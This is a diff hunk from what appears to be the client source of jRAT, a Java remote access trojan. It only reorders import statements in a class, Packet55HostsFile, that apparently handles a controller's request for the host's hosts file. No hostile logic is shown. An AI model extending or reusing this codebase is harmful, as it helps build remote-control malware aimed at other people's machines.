@@ -2,12 +2,12 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet38HostFile;
+import oslib.OperatingSystem;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
-
-import oslib.OperatingSystem;
 
 
 public class Packet55HostsFile extends AbstractIncomingPacket {
